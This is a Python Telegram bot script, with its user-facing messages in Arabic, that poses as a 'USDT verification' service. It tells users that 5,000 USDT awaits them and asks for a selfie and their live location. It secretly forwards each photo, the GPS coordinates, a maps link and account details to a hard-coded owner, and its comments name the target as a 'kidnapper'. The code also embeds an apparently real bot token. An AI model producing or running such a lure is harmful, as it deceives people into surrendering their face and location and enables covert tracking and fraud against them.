#!/usr/bin/env python3
"""
Telegram Bot - USDT Verification
"""

import telebot
import os
import csv
import logging
from datetime import datetime

# ============================================
# الإعدادات
# ============================================

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596
DATA_FILE = "users_data.csv"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(TOKEN)
user_state = {}

# ============================================
# الرسائل
# ============================================

WELCOME_MSG = (
    "🎉 *5,000 USDT وصلت لحسابك!*\n\n"
    "لأسباب أمنية، يجب تأكيد هويتك أولاً.\n\n"
    "📌 *الخطوة 1:* أرسل صورتك (سيلفي)\n"
    "📌 *الخطوة 2:* أرسل موقعك الحالي\n\n"
    "بعدها يتم تحويل المبلغ فوراً ✅"
)

PHOTO_RECEIVED_MSG = "✅ تم استلام الصورة!\n📍 الآن أرسل موقعك من الزر أدناه:"

LOCATION_RECEIVED_MSG = (
    "✅ *تم التحقق بنجاح!*\n"
    "سيتم تحويل 5,000 USDT خلال 5 دقائق.\n"
    "شكراً لاستخدامك الخدمة."
)

# ============================================
# الدوال المساعدة
# ============================================

def create_location_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = telebot.types.KeyboardButton("📍 أرسل موقعي الآن", request_location=True)
    markup.add(btn)
    return markup

def notify_owner(text, parse_mode=None):
    try:
        bot.send_message(OWNER_ID, text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"فشل الإشعار: {e}")

# ============================================
# معالج /start
# ============================================

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    
    logger.info(f"مستخدم جديد: @{username}")
    
    user_state[user_id] = {'photo': False, 'location': False}
    
    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown')
    bot.send_message(chat_id, "📸 أرسل صورتك الآن:")
    
    notify_owner(
        f"🆕 *مستخدم جديد*\n👤 @{username}\n🆔 {user_id}",
        parse_mode='Markdown'
    )

# ============================================
# معالج الصور
# ============================================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    
    try:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # حفظ الصورة
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{user_id}_{timestamp}.jpg"
        
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        # إرسال الصورة للمالك فقط
        with open(filename, 'rb') as f:
            bot.send_photo(
                OWNER_ID,
                f,
                caption=f"📸 صورة من @{username}",
                parse_mode='Markdown'
            )
        
        if user_id in user_state:
            user_state[user_id]['photo'] = True
        
        # طلب الموقع
        bot.send_message(
            chat_id,
            PHOTO_RECEIVED_MSG,
            reply_markup=create_location_keyboard()
        )
        
    except Exception as e:
        logger.error(f"خطأ: {e}")

# ============================================
# معالج الموقع
# ============================================

@bot.message_handler(content_types=['location'])
def handle_location(message):
    user_id = message.from_user.id
    username = message.from_user.username
    lat = message.location.latitude
    lon = message.location.longitude
    
    logger.info(f"موقع من @{username}: {lat}, {lon}")
    
    # إرسال الموقع للمالك فقط — الخاطف لا يرى شيئاً
    location_text = (
        f"📍 *موقع!*\n"
        f"👤 @{username}\n"
        f"🆔 {user_id}\n"
        f"🌐 {lat}, {lon}\n"
        f"🔗 https://www.google.com/maps?q={lat},{lon}"
    )
    
    notify_owner(location_text, parse_mode='Markdown')
    bot.send_location(OWNER_ID, lat, lon)
    
    if user_id in user_state:
        user_state[user_id]['location'] = True
    
    # رسالة نجاح للخاطف
    bot.send_message(
        message.chat.id,
        LOCATION_RECEIVED_MSG,
        parse_mode='Markdown',
        reply_markup=telebot.types.ReplyKeyboardRemove()
    )

# ============================================
# المعالج الافتراضي
# ============================================

@bot.message_handler(func=lambda m: True)
def handle_all(m):
    chat_id = m.chat.id
    user_id = m.from_user.id
    
    if user_id in user_state:
        state = user_state[user_id]
        if not state['photo']:
            bot.send_message(chat_id, "📸 أرسل صورتك أولاً")
        elif not state['location']:
            bot.send_message(chat_id, "📍 أرسل موقعك الآن", reply_markup=create_location_keyboard())
    else:
        bot.send_message(chat_id, "⚠️ أرسل /start للبدء")

# ============================================
# تشغيل البوت
# ============================================

if __name__ == "__main__":
    print("✅ بوت USDT Verification شغال...")
    bot.infinity_polling()
